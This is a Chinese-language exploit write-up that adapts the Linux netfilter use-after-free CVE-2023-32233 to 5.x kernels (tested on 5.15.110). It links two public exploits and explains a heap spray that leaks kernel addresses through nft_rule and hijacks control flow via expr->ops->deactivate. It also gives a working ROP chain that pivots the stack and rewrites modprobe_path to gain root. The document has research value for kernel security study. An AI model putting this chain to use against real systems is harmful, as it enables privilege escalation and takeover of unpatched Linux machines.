# CVE-2023-32233 5.x内核适配

## 现有EXP
1. https://github.com/Liuk3r/CVE-2023-32233/tree/main
2. https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-32233_mitigation


## 原因
由于低版本（<5.16）内核中缺少了[补丁](https://github.com/torvalds/linux/commit/ed0a0c60f0e50fa52853620672af97edde3d3a03)，导致无法使用`nft_quota`结构体的`consumed`字段来写读写内存地址，考虑使用rop的方法进行提权。google的exp里使用了`NFT_MSG_DELRULE+NFT_MSG_DELSET`的方法来触发uaf，但是实际测试中发现该脚本会在`nf_table_commit->list_del_rcu`中直接crash。

## 方法
> 本exp在v5.15.110版本测试通过

结合两个exp，喷射`nft_rule`结构体，通过`list_head`泄漏内核栈地址，通过`nft_expr->ops`泄漏内核地址，通过`nft_expr->ops->deactivate`劫持控制流。
```c
struct nft_rule {
	struct list_head		list;
	u64				handle:42,
					genmask:2,
					dlen:12,
					udata:1;
	unsigned char			data[]
		__attribute__((aligned(__alignof__(struct nft_expr))));
};

struct nft_expr {
	const struct nft_expr_ops	*ops;
	unsigned char			data[]
		__attribute__((aligned(__alignof__(u64))));
};


static void nft_rule_expr_deactivate(const struct nft_ctx *ctx,
				     struct nft_rule *rule,
				     enum nft_trans_phase phase)
{
	struct nft_expr *expr;

	expr = nft_expr_first(rule);
	while (nft_expr_more(rule, expr)) {
		if (expr->ops->deactivate)
			expr->ops->deactivate(ctx, expr, phase);        // [7]

		expr = nft_expr_next(expr);
	}
}
```

为了提权方便，直接沿用exp1基于`modprobe_path`的方法，构造的ROP如下。
```c
// /sbin/modpath -> //tmp/modpath
void make_payload_rop(uint64_t* data) {
    data[0] = kbase + POP_5REG_RET; // skip metadata
    data[5] = kbase + PUSH_RAX_POP_RSP; // expr->ops->deactivate
    // /tmp/mod -  sbin/mod
    // 0x646f6d2f706d742f - 0x646f6d2f6e696273 = 0x20411bc
    data[6] = kbase + POP_RAX_RET;
    data[7] = kbase + cfg_modprobe_path+1; // [rax]
    data[8] = kbase + POP_RDI_RET;
    data[9] = 0x20411bc; // rdi
    data[10] = kbase + ADD_RAX_0_EDI; // add [rax], edi
}
```
首先内核执行到`data[5]`处，`rax`中保存的块开头的地址（`&data[0]`）,使用`push rax; pop rsp; ret;`完成栈迁移，不可避免的造成栈破坏（后续无法正常返回用户态，如果需要到用户态提权可以构造更大的块（>0x80）参考exp中的`make_payload_rop2`，使用`swapgs_restore_regs_and_return_to_usermode`绕过`kpti`并返回用户态）。
由于伪造的`nft_rule`有0x18字节元数据（主要是0x10偏移处的8字节），需要使用`pop`跳过这些地址，后面就随意发挥了，使用一些简短的`gadgets`修改`modprobe_path`即可。